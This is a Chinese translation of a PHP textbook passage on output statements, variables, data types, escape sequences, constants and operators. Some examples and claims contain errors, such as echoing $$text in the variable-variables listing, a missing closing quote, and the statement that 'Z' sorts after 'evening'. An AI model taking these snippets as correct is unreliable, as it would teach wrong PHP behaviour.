12 语言结构（语句）是一种 PHP 指令。在本书中，我们区分语言结构（同义词：语句、语言指令）和函数。更多内容将在第 6 章中介绍。





这两个语句的区别在于，echo 只是输出传递的内容，而 print 会返回一个返回值。13

这个返回值可以写入变量（第 4.3 节）并保存。如果输出成功，该值为 1。

```
<?php
$t = print "Output";
echo $t;
?>
```

### 清单 4.3 "print" 的返回值 ("print.php")

清单 4.3 打印该行：

```
Output
```

在实践中，返回值很少被使用。

### 4.2.1 摘要

如果你只在 PHP 块开始后直接输入等号，则更短：

```
<?="Short edition"?>
```

> **提示**
> 在 PHP 5.3 及更早版本中，必须将 short_open_tags 设置为 on 才能使用短形式。自 5.4 版本起，即使 short_open_tags 被禁用，<?= 也可用。

### 4.2.2 引号

由于输出用引号括起来，14 问题是字符串中如何处理引号。PHP 允许使用单引号和双引号来界定输出（或字符串）。

因此你可以写：

```
echo "Output";
```

或

```
echo 'Output';
```

13 之所以存在这一差异，是因为 print 实际上是一个运算符。参见第 5 章第 5.1.5 节中的 "print" 部分。

14 它是一个字符串（也简称为字符串）。下一节将详细介绍。

要使用双引号或单引号，必须使用另一种类型的引号来界定输出：
echo 'He said: "I think, therefore I am!"';

图 4.2 中显示了相应的输出。

![](img/ae7820c36e8f24c1623d26668b28e80e_99_0.png)

图 4.2 输出中的引号

如果要在字符串中同时使用单引号和双引号，必须使用反斜杠转义相应的引号：
echo 'McDonald\'s eater: "I love nothing!"';

有关转义的更多信息，请参阅第 4.3.4 节。

## 4.3 变量

变量存储一个值。这个值在脚本运行过程中可以改变，因此它是 _可变的_，这也正是变量名称的由来。

在 PHP 中，所有变量都以美元符号 ($) 开头。<sup>15</sup> 与其他编程语言不同，PHP 不要求在变量首次出现时进行声明。但你当然必须为变量赋值。这可以通过等号 (=)，即所谓的赋值运算符来完成。因此，下面将内容为 "value" 的字符串赋值给变量 `text`。

$text = "Value";

### 4.3.1 数据类型

字符串始终写在引号中。然而，字符串并非变量可以接受的唯一数据类型。PHP 还区分以下数据类型：

- 整数（`integer` 和 `int`）是整数：

$number = 8;

15 这种语法基于 Perl，这是一种非常强大但有时相当复杂的脚本语言。总体而言，PHP 的语法大量借鉴了 Perl，并且也采用了正则表达式。

- Double 是浮点数的数据类型。Double 还包含整数：

- $commaNumber = 8.4;

- Real 是 double 的另一个名称。

- 布尔值（boolean 或 bool）代表真值。布尔值只有 true（真）或 false（假）两个值。真值的示例包括条件和检查的结果：

- $true = true;

- object 代表 PHP 中的对象。有关更多信息，请参见第 11 章。

- 数组可以存储多个值，对编程非常重要。有关数组的更多信息，请参见第 8 章。

- resource 是 PHP 内部使用的数据类型，例如用于存储对数据源的访问。

- NULL 不表示一个值，但本身也是一种数据类型。

在大多数情况下，您不需要担心数据类型，因为 PHP 会自动确定变量值的数据类型并在其更改时进行转换。但是，自动类型转换并不总是按预期和/或所需的方式工作。因此，接下来的两个部分首先展示如何确定变量的数据类型，然后展示如何更改类型。

![](img/ae7820c36e8f24c1623d26668b28e80e_100_0.png)

### 确定数据类型

使用 gettype(Variable) 函数，可以查找变量的数据类型。数据类型以长形式返回——例如，boolean 而不是 bool（参见图 4.3）。

```
<?php
$a = "Text";
echo gettype($a);
?>
```

### 清单 4.4 确定数据类型 ("datatype.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_100_1.png)

string、is_numeric() 检查是否为数字，等等。返回值始终是一个真值：如果存在该数据类型，则为 true；否则为 false。

![](img/ae7820c36e8f24c1623d26668b28e80e_101_0.png)

图 4.3 数据类型是字符串

### 类型转换

通常在 PHP 中您不需要担心类型转换。在许多编程语言中，下一个清单中的脚本会将数字追加到字符串上。但是，由于 PHP 使用其自身的运算符（点号 .）来连接字符串，因此此处的类型转换工作正常。

```
<?php
$a = "3";
$b = 5;
$erg = $a + $b;
echo $erg;
?>
```

### 清单 4.5 自动类型转换 ("typeconversion_auto.php")

因此计算结果如下：

8

如果确实需要进行类型转换，可以在 PHP 中使用来自 C 语言的类型转换。将要转换的变量前面写上数据类型（短形式或长形式）。

```
<?php
$a = "true";
$b = (bool) $a;
echo $b;
?>
```

### 清单 4.6 PHP 中的类型转换 ("typeconversion.php")

前一个清单中的脚本输出为真值 1，代表 true：

1

作为在变量前使用数据类型进行转换的替代方法，还可以使用 settype(variable, data type) 函数。数据类型作为字符串传递。

```
<?php
$a = "true";
$b = settype($a, "boolean");
echo $b;
?>
```

### 清单 4.7 "settype()" ("settype.php")

与前面的转换一样，你将得到 1。

### 4.3.2 命名

PHP 中的变量名只能由字母、数字和下划线 (_) 组成。它只能以字母或下划线开头：不能以数字开头。

尽管有这些限制，PHP 在变量命名方面是最为宽松的编程语言之一。echo 或 if 等语言构造和语句的名称可以用作变量名16：

```
$echo = "Value";
echo $echo;
```

这段代码输出一个值。

当然，某事可能并不意味着就应该使用。因此，优秀的程序员更愿意远离此类“实验”。你还应该始终为变量赋予有意义的名称。变量不必只由三个字符组成，连续编号通常也非常令人困惑，尤其是在稍后扩展脚本时。

你应始终在项目前定义变量的命名约定。以下是一些建议：

- 对于复合名称，可以使用下划线 (_) 分隔单词：

```
$value_left = 5;
```

- 或以大写字母开头新单词：17

```
$valueLinks = 5;
```

16 这些名称也称为关键字。在大多数编程语言中，关键字不能用作变量名。

17 这种样式也称为驼峰命名法，以骆驼的驼峰命名。

- 或者，每个单词都以大写字母开头。18

```
$ValueLeft = 5;
```

### 可变变量

变量变量名的概念是这样的：你将一个字符串赋值给一个变量。现在可以将此变量定义为另一个变量的名称。这样就创建了一个变量，它的名称是第一个变量的字符串，值是第二个变量的值（参见图 4.4）。

```
<?php
$a = "text";
$$a = "Text for output";
echo $$text;
?>
```

### 清单 4.8 变量名作为变量 ("variable_variables.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_103_0.png)

图 4.4 变量使用正确

> **注意**
> 动态生成变量名称时，组合变量名称特别有用。

### 4.3.4 输出变量

在迄今所示的示例中，变量的值通常使用 echo（或者 print）输出。这可以毫无问题地工作：

```
$text = "Hello PHP 8";
echo $text;
```

这些行因此显示以下内容：

Hello PHP 8

18 这种变体也称为 Pascal 命名法（以 Pascal 编程语言命名），或者在 PHP 中更常见地称为 studlyCaps。Pascal 以数学家 Blaise Pascal 命名。





不过，你也可以在字符串中输出变量：

```
$text = "Hello";
echo "$text PHP 8";
```

这两行也会生成以下输出：

Hello PHP 8

不过，这仅在你使用双引号时有效。使用单引号时，变量不会被包含（参见图 4.5）：

```
$a = "Hello";
echo '$a PHP 8';
```

![](img/ae7820c36e8f24c1623d26668b28e80e_104_0.png)

图 4.5 因为使用了单引号，所以输出变量名

双引号和单引号的区别不仅在使用变量时适用，在转义序列中也同样适用。在转义序列中，字符使用反斜杠（\）进行转义，或者转义序列产生特定效果。在转义序列中，双引号和单引号的区别非常简单：

- 对于单引号，你只能转义单引号和，如有必要，反斜杠，正如你已经看到的：

```
echo 'McDonald\'s eater: "I love nothing!";
```

如果你使用不同的转义序列，它不会被执行，而是会连同反斜杠一起输出。

- 对于双引号，你可以随意使用单引号，对双引号取消转义，并使用一些转义序列：

```
$version = "PHP 8";
echo "The variable \$version has the value:\n $version";
```

如果你查看此示例的输出，你会发现 \n 没有被输出。这是因为 \n 仅在源代码中创建换行，而不是在 HTML 中。为此你需要 <br /> HTML 标签。如果你查看 Web 浏览器中的源代码，你会识别出换行：

The variable $version has the value
PHP 8

| 转义序列 | 说明 |
| :--- | :--- |
| `\\` | 输出反斜杠。如果你仅输出反斜杠而其后没有转义字符串序列，也可以达到相同效果。 |
| `\"` | 双引号。 |
| `$` | 美元符号。 |
| `\n` | 换行（ASCII 10），但在 HTML 中不是。为此你需要 <br /> HTML 标签。 |
| `\r` | 回车（ASCII 13）。 |
| `\t` | 制表符（ASCII 9）。 |
| `\u` | 任意十六进制形式的 Unicode 字符** (UTF-8)。 |
| `\000` | 一到三位数字表示八进制表示法中的数字。* 然后输出相应字符。 |
| `\x00` | 一个 x 和一位或两位数字组成十六进制表示法中的数字。** |

*八进制表示法：八进制系统的基数为 8。所有数字都从 0 到 7。转换如下：245 变为 2 x 64 + 4 x 8 + 5，结果为 165。

**十六进制表示法：十六进制系统以 16 为基数书写数字，因此有 16 个字符——即从 0 到 9 以及字母 A 到 F。你将由两位数字组成的十六进制数转换如下：将第一位数字乘以 16，然后将第二位数字加到结果上。十六进制数例如用于 HTML 中的颜色表示。

表 4.1 双引号的转义序列

### 4.3.5 有用和有帮助的信息

本节包含使用 PHP 不一定需要，但对于高级任务有用的信息。

### "isset()"

isset(Variable) 辅助函数检查变量是否存在。它返回一个布尔值作为结果。由于直接输出这个布尔值并不怎么有趣，我们将稍微超前一点，展示一个将在下一章中详细讨论的条件分支。

以下清单中的脚本检查变量是否存在。如果存在，则输出该变量；否则，显示一条备选消息。

```php
<?php
$test = "Text variable";
if (isset($test)) {
    echo $test;
} else {
   echo "Variable not set";
}
?>
```

清单 4.9 "isset()" ("isset.php")

在前面的示例中，变量已设置，因此被输出。但是，如果你根本没有给变量赋值会怎样？

```
$test;
if (isset($test)) {
   echo $test;
} else {
   echo "Variable not set";
}
```

在这种情况下，备选文本变量未设置。

> **注意**
> 如果变量的值为 NULL（无值），isset() 也会返回 false。

### "empty()"

`empty()` 执行与 `isset()` 类似的测试。`empty(Variable)` 检查变量是否为空（参见图 4.6）。但是，空变量也可以是空字符串或 0。这与 `isset()` 的区别所在。

```
<?php
$test = "";
if (empty($test)) {
   echo "Variable is empty";
} else {
   echo $test;
}
?>
```

清单 4.10 "empty()" ("empty.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_106_0.png)

图 4.6 由于字符串为空，"empty()" 返回 "true"

> 注意
> 在 PHP 文档中，你会发现一个关于各种测试函数的相当有趣的比较表（http://s.php.co/v602211；参见图 4.7）。

![](img/ae7820c36e8f24c1623d26668b28e80e_107_0.png)

图 4.7 如果你有特定的比较问题，不同函数的比较非常有信息量

### "is_null()"

is_null(Variable) 函数也是辅助和测试函数之一。它测试变量是否具有 NULL 值（无值）。

```php
<?php
$test = null;
if (is_null($test)) {
    echo "Variable is NULL";
} else {
    echo "Variable is not NULL, but " . $test;
}
?>
```

清单 4.11 "is_null()" ("is_null.php")

在前面的示例中，测试的变量为 null，因此输出以下内容：

```
Variable is NULL
```

> **注意**
>
> 遗憾的是，PHP 中函数的拼写不太一致。`isset()` 写在一起，而 `is_null()` 带有下划线。出于历史原因：这些函数曾经就这样被命名，然后——为了保持脚本的向后兼容性——就无法再重命名了。

### "unset()"

unset(Variable) 语言结构删除变量。例如，如果你想故意在主内存中创建空间，就需要此函数。

```php
<?php
$test = "One variable.";
echo $test;
unset($test);
echo $test;
?>
```

清单 4.12 "unset()" ("unset.php")

此示例只输出一次文本 "One variable."。在第二次输出中，变量不再存在。PHP 会显示错误消息 "Undefined variable"。

> **注意**
>
> 如果你通过引用将参数传递给函数（参见第 6 章），那么 `unset()` 只删除局部变量，而不是引用所指向的原始变量。

## 引用

通常，一个变量只有一个值。变量的值由 PHP 解释器存储在主内存中。但是，你也可以让多个变量引用同一个值。这可以使用和号字符（&）来实现。具体操作如下：你创建一个变量，然后使用和号将对该变量的引用赋值给另一个变量。

```php
<?php
$a = "A variable";
$b = &$a;
$a = "Changed variable";
echo $b;
?>
```

清单 4.13 变量引用 ("variable_reference.php")

如果你随后更改原始变量——在前面的示例中为 $a——那么带有引用的变量（在此例中为 $b）也会接收到新值（参见图 4.8）。顺便说一句，等号和和号之间可以有空格，或者和号可以直接放在 $a 变量前面。

![](img/ae7820c36e8f24c1623d26668b28e80e_109_0.png)

图 4.8 更改后的值被输出，因为 "$b" 包含对其的引用

### 4.3.6 预定义变量

像 PHP 这样的语言不仅由语言核心组成。PHP 周围有一个大环境：HTML 表单、Cookie（即浏览器中的小文本文件）等等。PHP 为这个环境提供预定义变量，你将在本书中逐一了解。以下是其中几个：

- $_GET 包含通过 GET 从表单附加到 URL 的值。
- $_POST 包含通过 POST 从表单发送的值。
- $_COOKIE 包含有关 Cookie 的信息。第 12 章将对此进行更多介绍。
- $_REQUEST 包含上述三个变量中的信息。你可以在第 12 章和第 13 章中了解更多。
- $_SESSION 提供会话变量的数据。你可以在第 15 章中了解更多。
- $_SERVER 包含有关 PHP 安装和 Web 服务器的信息。
- $_ENV 提供 PHP 运行所在环境的信息。
- $_FILES 由有关上传文件的数据组成。你可以在第 25 章中找到相关信息。
- $GLOBALS 包含所有全局变量。你可以在第 6 章的 6.1.2 节中了解更多。




> **注意**
>
> 这些预定义变量也被称为*超全局数组*，因为它们在 PHP 中到处都可用。自 PHP 4.1.0 版本起，它们就已可用。在此之前，这些数组已经存在，但名称不同，且始终以 `$HTTP_` 开头——例如，`$HTTP_GET_VARS`。你可以在引用的章节中了解更多有关超全局数组的信息。你将在*第 13 章*中了解最重要的几个。

### 4.4 常量

与变量不同，常量始终保持相同的值，且仅在开始时定义一次。在 PHP 中，你使用 `const` 关键字来定义它，或者（较少见地）使用 `define()` 函数：

```php
const constant = "value";
define("Constant", "Value");
```

可以随时使用其名称访问常量：

```php
echo constant;
```

这将输出其值——在这里，即字符串值。

或者，你可以使用 `constant(Name)` 函数访问常量：

```php
echo constant("constant");
```

当常量名仅作为引用传递时（例如，存储在变量中或作为函数的参数），会使用此函数：

```php
$Name = "Constant";
constant($Name);
```

> **注意**
>
> 与变量不同，常量没有 $ 符号。此外，全局定义的常量会自动应用于整个脚本。

# 第 5 章

# 编程

不修边幅、留着长发的程序员这一陈词滥调当然大部分时候是个神话。尽管如此，编程仍需要热情。它不会妨碍你去洗手间和理发店，但确实需要花费一些时间。

在本章中，你将学习 PHP 的语法、最重要的语言结构以及基础知识。

## 5.1 运算符

运算符的主要任务只有一个：将数据相互连接。被连接的数据称为操作数。一个运算符可以处理一个、两个或三个操作数。1 最常见的情况是两个操作数。操作数可以是变量或字面量。下面是使用字面量的示例：

```
1   +   2
Operand Operator Operand
```

以及使用变量：

```
$a   +   $b
Operand Operator Operand
```

### 5.1.1 算术运算符

加法、减法、乘法和除法：这些是你在数学课上学过的算术运算。在 PHP 中使用它们非常简单。

```php
<?php
$a = 7;
$b = 3;
$result = $a * $b;
echo $result;
?>
```

清单 5.1 运算符的使用（“operators.php”）

1 一个操作数的运算符也称为一元运算符，两个操作数称为二元运算符，三个操作数称为三元运算符。

算术运算符只能应用于数字。除了基本算术运算的运算符和用于负数的减号之外，还有模运算符，它由百分号 (%) 表示。模运算符表示除法的整数余数：

```php
$a = 7;
$b = 3;
$result = $a % $b;
```

根据这些行，$result 变量的值为 1。计算方法如下：7 除以 3 等于 2 余一些（更精确地说，是三分之一）。因此，除法的整数结果为 2。2 乘以 3 等于 6。因此，除法的整数余数为 7 减去 6，即 1。你可以通过将小数位（这里是三分之一：≈ 0.333333333333）再乘以 3 来更快地得出此结果。

表 5.1 提供了算术运算符的概览。

| 运算符 | 示例 | 描述 |
|---|---|---|
| + | $result = 7 + 3; //10 | 两个数相加 |
| - | $result = 7 - 3; //4 | 两个数相减 |
| * | $result = 7 * 3; //21 | 两个数相乘 |
| / | $result = 7 / 3; //2.333333333333 | 两个数相除 |
| % | $result = 7 % 3; //1 | 计算除法的整数余数 |

表 5.1 算术运算符

#### 简写形式

如果要更改变量的值，可以按以下方式进行：

```php
$result = 7;
$result = $result + 3;
```

但是，最后一步有些冗长。因此，有一种简写形式，直接将算术运算符与赋值运算符连接起来：

```php
$result = 7;
$result += 3;
```

所有算术运算符都有这些简写形式。它们在表 5.2 中列出。

| 运算符 | 示例（“$result = 7”） | 描述 |
| :--- | :--- | :--- |
| += | $result += 3; //10 | 两个数相加 |
| -= | $result -= 3; //4 | 两个数相减 |
| *= | $result *= 3; //21 | 两个数相乘 |
| /= | $result /= 3; //2.333333333333 | 两个数相除 |
| %= | $result %= 3; //1 | 计算除法的整数余数。 |

表 5.2 简写形式

#### 自增和自减

可以更短。使用自增运算符 (++) 将值加 1，使用自减运算符 (--) 将值减 1。在以下行中，你将 $a 从 7 增加到 8：

```php
$a = 7;
$a++;
```

> **注意**
>
> 自增和自减主要用于循环（第 5.3 节）。

自增和自减的关键在于它们位于变量之前还是之后。位于变量之前意味着在其他语句之前执行自增。在以下示例中，$result 变量接收结果 11，因为 $a 变量在随后与 $b 相加之前先增加 1 到 8：

```php
$a = 7;
$b = 3;
$result = ++$a + $b;
```

如果自增位于 $a 变量之后，则仅在语句之后才会增加：

```php
$result = $a++ + $b;
```

在这种情况下，$result 仅为 10，但 $a 已上升到 8。

#### 指数运算符

指数运算符 ** 引入于 PHP 5.6。顾名思义，其任务是进行指数计算。下面是一个简单示例：

```php
$a = 2;
$n = 4;
$result = $a ** $n;
```

根据这些行，$result 变量的值为 16。第二个操作数始终是指数；也就是说，此计算对应于 2⁴。

和往常一样，它也有简写形式：

```php
$result = 2;
$result **= 4;
```

#### 连接字符串

在许多编程语言中，加号不仅用于连接数字，还用于连接字符串（参见图 5.1）。在 PHP 中并非如此。相反，使用点号 (.)：

```php
<?php
$a = "Everything new ";
$b = "May makes.";

$result = $a . $b;
echo $result;
?>
```

清单 5.2 连接字符串（“string_concatenation.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_114_0.png)

图 5.1 连接了两个字符串

> 连接字符串也称为拼接。字符串还有许多其他可能性。你可以在第 7 章中阅读更多相关内容。

用于链接字符串的运算符也可与赋值运算符配合使用简写形式：

```php
$result = "Everything new ";
$result .= "May makes";
```

$result 变量被赋值为 May is new。

###### 5.1.2 比较运算符

使用 PHP 时，你经常会遇到需要比较两个值的情况。例如，在表单的完整性检查中，你会比较某个值是否已在文本框中输入。

比较运算符负责进行比较。它们将两个操作数相互比较：

```
7 > 3
Operand Operator Operand
```

结果是一个真值（布尔值）——即 true 或 false。因此，比较 7 > 3 的结果为 true，因为 7 大于 3。PHP 在输出中也会将真值作为数字返回。在这种情况下，true 为 1，false 为 0。

> 注意
>
> 例如，如果使用 echo 输出比较运算符操作的返回值，则会输出表示 true 的 1，但不会输出表示 false 的 0。

你可能已经熟悉大多数比较运算符。表 5.3 提供了概览。

| 运算符 | 示例 | 描述 |
|---|---|---|
| > | `$result = 7 > 3 //true` | 大于 |
| < | `$result = 7 < 3 //false` | 小于 |
| >= | `$result = 3 >= 3 //true` | 大于或等于 |
| <= | `$result = 3 <= 3 //true` | 小于或等于 |
| == | `$result = 7 == 3 //false` | 等于 |
| != | `$result = 7 != 3 //true` | 不等于 |
| <> | `$result = 7 <> 3 //true` | 不等于 |

表 5.3 比较运算符

> 注意
>
> 最常见的错误之一是在相等性检查中使用单个等号而不是双等号。此错误难以发现，因为例如在 if 语句（第 5.2 节）中，单个等号会被解释为赋值。这意味着 PHP 不会抛出错误消息，而是将比较的右半部分评估为左半部分变量的值。这意味着 if state-

条件总是成立，除非值为 0 或 false。你可以在工作文件中找到 equals.php 示例。

## 精确相等与精确不等

如果你在相等和不等比较运算符后加上一个等号（== 变成 ===，!= 变成 !==），它们就变成了 _精确相等_ 和 _精确不等_。这意味着值的数据类型也会被包含在比较中：

```
$a = 3;
$b = "3";
$result = $a === $b;
```

$result 变量的值是什么？因为 $a 变量是数字而 $b 是字符串，所以结果是 false。如果你选择的是简单相等而不是精确相等，

```
$result = $a == $b;
```

那么结果将为 true。

## 比较字符串

如果你想互相比较两个字符串，这是可行的，但会面临诸多问题。字符串比较的基础是各个字符的 ASCII 码。该代码为最重要的字符和字母定义了数字（参见图 5.2）。字母从 ASCII 码中大写字母 A 的位置 65 开始。

不过，你无需背诵完整的 ASCII 表来预测字符串比较的结果。以下几条经验法则会有所帮助：

- 小写字母始终大于大写字母，因为它们的 ASCII 码更高。
- 大写字母的 ASCII 码按字母顺序从 65 到 90。
- 小写字母的码按字母顺序从 97 到 122。
- 字符串中的字母从左到右进行比较。

以下示例说明了这些规则：

```
$a = "a";
$b = "b";
$result = $a < $b;
```

2 精确相等和精确不等也称为 _同一性_ 和 _非同一性_。

## ASCII 表与说明

ASCII 是 American Standard Code for Information Interchange 的缩写。计算机只能理解数字，因此 ASCII 码是字符（如 'a' 或 '@'）或某种操作的数字表示形式。ASCII 很早以前就被开发出来，如今非打印字符很少用于其原始用途。下面是 ASCII 字符表，其中包含前 32 个非打印字符的描述。ASCII 最初是为电传打字机设计的，因此描述有些晦涩。如果有人说他们想要你的 ASCII 格式简历，这只意味着他们想要“纯文本”，即没有制表符、粗体或下划线等格式的文本——任何计算机都能理解的原始格式。这样通常是为了让他们能够轻松地将文件导入到自己的应用程序中而不会出现问题。Notepad.exe 创建 ASCII 文本，或者在 MS Word 中你可以将文件另存为“仅文本”。

![](img/ae7820c36e8f24c1623d26668b28e80e_117_0.png)

### 扩展 ASCII 码

| 128 | Ç | 144 | É | 160 | á | 176 | ░ | 192 | L | 208 | ¡ | 224 | α | 240 | ≡ |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| 129 | ü | 145 | ñ | 161 | í | 177 | ▒ | 193 | ⊥ | 209 | ¿ | 225 | β | 241 | ± |
| 130 | é | 146 | Æ | 162 | ó | 178 | ▓ | 194 | ⌐ | 210 | π | 226 | Γ | 242 | ≥ |

**图 5.2** ASCII 表显示各个字符的代码（参见 _www.asciitable.com_）

通过这些行，$result 变量将获得值 true，因为小写 a 的 ASCII 码低于小写 b。

下一个示例的结果为 false：

```
$a = "a";
$b = "B";
$result = $a < $b;
```

原因：大写 B 的 ASCII 值低于所有小写字母（包括小写 a）。

对于较长的字符串，PHP 从左到右进行比较：

```php
$a = "abzzz";
$b = "acaaa";
$result = $a < $b;
```

在此示例中，结果因此为 true。解释器看到第一位字符相同，检查第二位，并注意到那里的小写 b 小于小写 c。此后的字符不再起作用。

如果两个字符串长度不同，比较仍然从左到右进行：因此 Z 大于 evening。如果两个字符串中的字符相同，则较长的字符串始终更大：

```php
$a = "abc";
$b = "abcde";
$result = $a < $b;
```

在此情况下，$b 因此大于 $a，结果（$result）因此为 true。

> **注意**
> 
> 在本章文件夹的工作文件中，你会找到 `strings_compare.php` 文件，其中包含此处显示的示例。

> **提示**
> 
> 在 PHP 中，比较字符串时存在一些不寻常的行为：如果两个包含数值的字符串相互比较，则在比较前将字符串转换为数字。
> 
> ```php
> $a = "5.40";
> $b = "5.4";
> $result = $a == $b;
> ```
> 
> 因此结果为 true。如果使用精确相等（===）进行相同的比较，结果将为 false，因为在此情况下会应用字符串比较，而变量 $a 中追加的 0 会产生差异。
> 
> 当将数字与字符串进行比较时会稍微复杂一些，如下例所示：
> 
> ```php
> $c = 0;
> $d = 'Test';
> $result = $c == $d;
> ```
> 
> PHP 7.x 在这里将返回 true，因为字符串会自动转换为数字。但是，由于该字符串不包含有意义的数字，结果将为 0，而比较 0 == 0 将返回 true。这不够规范，因此 PHP 8 进行了整理。只有当字符串转换为数字后也能得出有意义的数字时，才会将其转换为数字。否则，将按字符串基础进行比较；也就是说，"0" 与 "test" 进行比较，结果为 false。

## 按字母顺序排序字符串

要按字母顺序对字符串进行排序，有一个简单的技巧：将字符串存储在专门用于比较的变量中，并在比较前将它们转换为小写或大写字母（参见图 5.3）。

```php
<?php
$a = "a";
$b = "B";

$a_low = strtolower($a);
$b_low = strtolower($b);

if ($a_low < $b_low) {
    echo "$a is before $b in the alphabet.";
} else {
    echo "$b is before $a in the alphabet.";
}
?>
```

清单 5.3 按字母顺序排序字符串（"strings_sort.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_119_0.png)

图 5.3 现在字符串比较不再区分大小写字符

在实践中，这个简单的技巧通常与数组一起使用。PHP 提供了一个名为 sort() 的自有函数用于对数组进行排序：

```
$collection = array("Monet", "Chagal", "Dali", "Manet");
sort($collection);
```

如果输出排序后数组的第一个和最后一个元素，则会正确输出 Chagal 和 Monet：

```
echo "$collection[0] and $collection[3]";
```

但是，只要数组中有一个元素以小写字母开头，使用 sort() 进行排序就会失败（参见图 5.4）。

![](img/ae7820c36e8f24c1623d26668b28e80e_120_0.png)

图 5.4 字母顺序不正确

作为解决方案，我们将正确排序的技巧与 uasort(array, sort function) 函数相结合，该函数允许使用自定义排序函数（参见图 5.5）。排序函数始终比较数组中的两个元素，并返回 0（相等）、1（参数 a 大于 b）或 -1（参数 b 大于 a）作为比较结果。

```php
<?php
$collection = array("Monet", "chagal", "Dali", "Manet");

uasort($collection, "sortFunction");

function sortFunction($a, $b) {
    $a_low = strtolower($a);
    $b_low = strtolower($b);

    if ($a_low == $b_low) {
        return 0;
    } elseif ($a_low > $b_low) {
        return 1;
    } else {
        return -1;
    }
}

echo "$collection[0] und $collection[3]";

?>
```

清单 5.4 使用函数进行排序（"strings_sort_function.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_120_1.png)

图 5.5 现在即使有小写字母，字母排序也能正常工作

## 太空船运算符

太空船运算符不仅执行大于或小于的简单比较，而且还将第一个操作数小于（-1）、等于（0）或大于（1）第二个操作数作为结果返回。其优雅的名称源于其形状，因为太空船运算符有点像一艘飞船：`<=>`。它是 PHP 7 中的一个新功能。

以下清单提供了一个简单的示例（参见图 5.6）。

```
$a = 3;
$b = 7;
$result = $a <=> $b;
echo $result;
```

清单 5.5 太空船运算符（"spaceship.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_121_0.png)

图 5.6 "-1" 表示第一个操作数小于第二个操作数

### 5.1.3 逻辑运算符

使用比较运算符进行比较会返回一个真值。重点在于 _一个_。如果你想组合多个比较或多个真值，则需要 _逻辑运算符_。

对于两个真值，其形式如下：

```
true   &&   false
Operand Operator Operand
```

在此情况下，使用了逻辑 AND（`&&` 或替代 `and`）。只有当两个操作数都返回 `true` 时，它才返回 `true`。这就是前一行返回 `false` 的原因。

如果你使用两个比较，可以像这样使用逻辑运算符：

```
$result = 7 > 3 && 2 < 4;
```

此行将 `true` 作为结果返回，因为两个比较都返回 `true`，并且逻辑比较相应地返回 `true`。




> **注**
> 您也可以组合多个逻辑运算。但是，出于清晰起见，我们建议使用括号。

表 5.4 提供了逻辑运算符的概述。

| 运算符 | 示例 | 描述 |
| :--- | :--- | :--- |
| && and | `7 > 3 && 2 < 4; //true` | 逻辑 AND。如果两个操作数均返回 true，则返回 true。 |
| \|\| or | `7 < 3 \|\| 2 < 4; //true` | 逻辑 OR。如果一个或两个操作数返回 true，则返回 true。 |
| xor | `7 > 3 xor 2 < 4; //false` | 逻辑异或（XOR）。仅当两个操作数中只有一个为 true 时返回 true。如果两个操作数都不是 true 或都为 true，则返回 false。 |
| ! | `!false; //true` | 取反。反转真值。真变为假，假变为真。 |

表 5.4 逻辑运算符

PHP 中逻辑 AND 和逻辑 OR 有两种变体：一种使用符号，另一种使用字母。唯一的区别是，使用符号的变体具有更高的运算符优先级（第 5.16 节）。

## 短路求值

短路求值是一种旨在提高性能的 PHP 编程概念。如果第一个操作数的逻辑运算符比较已经满足或失败，则不再检查第二个操作数。在以下示例中，第一个比较已经返回 false。由于逻辑 AND 已经返回 false，因此不再检查第二个比较：

```
7 < 3 && 2 < 4;
```

在实践中，PHP 的这种行为通常对您的编程没有影响。函数调用是个例外。如果您希望确保无论如何都会调用两个函数，那么先执行简单比较是有意义的。

### 5.1.4 二进制数和位运算符

位运算符很少使用。它们用于直接在位级别进行操作。不过，在详细了解运算符之前，您将先学习数字位映射的基础知识。

位的值为 0 或 1。由于有两种可能的值，这也被称为二进制值。数据的相应表示法称为二进制表示法。每个整数都可以用位来表示。

二进制表示法由一个模式组成。该模式的位数与数字的位数相同。因此，一个四位数字有四位数，可以表示 2^4 个数字，即 16 个数字。

0010 代表数字 2。位模式从右到左读取。最右边的数字代表 1，右数第二个代表 2，第三个代表 4，第四个代表 8，依此类推。将这些数字相加即可得到整数。

请看一些示例：

- 1111 代表 8 + 4 + 2 + 1，即 15。
- 1010 代表 8 + 0 + 2 + 0，即 10。

> 注
> 在 PHP 中，您也可以直接以二进制表示法输入数字。为此，数字前加 0b——例如，0b1111 表示 15。

位运算符将整数作为二进制模式进行操作。按位 AND（&）在两个操作数都为 1 的位置设置 1。

```
10 & 3
```

因此，PHP 会首先在内部将其转换为以下二进制模式：

```
1010 & 0011
```

或者您可以直接写：

```
0b1010 & 0b0011
```

从最右边第一位来看，两个操作数都不是 1，因此比较结果在这一位是 0。在第二位，两个操作数都有 1，所以结果是 1。以此类推，会生成以下二进制模式：

```
0b0010
```

这对应于整数 2。

表 5.5 列出了所有位运算符及其二进制模式下的简单示例。要在 PHP 中实现这些示例，必须将二进制模式写为整数。

| 运算符 | 示例 | 描述 |
| :--- | :--- | :--- |
| `&` | `1010 & 0011<br>//Result: 0010 = 2` | 按位 AND；在两个操作数都有 1 的位置写入 1。 |
| `\|` | `1010 \| 0011<br>//Result: 1011 = 11` | 按位 OR；在一个或两个操作数包含 1 的位置写入 1。 |
| `^` | `1010 ^ 0011<br>//Result: 1001 = 9` | 按位异或（XOR）；仅当两个操作数中只有一个有 1 时，在该位写入 1。 |
| `~` | `~1010<br>//Result: 0101 = -11` | 按位取反；将 0 转换为 1，将 1 转换为 0。但是，基数是 32 位整数（有符号），因此结果不是值的直接反转。 |
| `<<` | `1010 << 1<br>//Result: 10100 = 20` | 按位左移；将左操作数的二进制模式向左移动右操作数指定的位数。右侧用零填充。移动一位相当于乘以 2，移动两位相当于乘以 4，移动三位相当于乘以 8，依此类推。 |
| `>>` | `1010 >> 1<br>//Result: 0101 = 5` | 按右操作数指定的位数将二进制模式向右移动。右侧剩余的位将被删除。如果左操作数带有负号，左侧用 1 填充，否则用 0 填充。移动一位相当于除以 2（无余数），移动两位相当于除以 4，移动四位相当于除以 8，依此类推。 |

## 表 5.5 位运算符

> 位移运算是最常用的位运算符之一，因为它提供了一种简单的方法来对二的幂进行除法和乘法运算。

所有二元运算符也都有与赋值运算符结合的简写形式。以下几行将 $a 变量的值从 10 改为 40：

```
$a = 10;
$a <<= 2;
